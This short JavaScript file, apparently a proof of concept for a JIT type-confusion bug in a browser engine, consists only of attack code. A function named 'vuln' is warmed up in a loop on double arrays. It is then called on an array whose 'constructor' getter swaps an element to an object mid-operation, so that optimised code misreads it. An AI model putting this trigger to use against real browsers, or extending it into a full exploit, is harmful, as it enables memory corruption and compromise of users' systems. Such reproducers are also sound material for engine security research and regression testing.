function vuln(a) {
  a[0];
  Array.prototype.concat.call(a);
  return a[0];
}

for (let i = 0; i < 20000; i++) {
  const arr = [1.1];
  vuln(arr);
}

let p = [2.2];
Object.defineProperty(p, 'constructor', {
  get: function() {
    p[0] = {};
    return Array;
  }
});

vuln(p);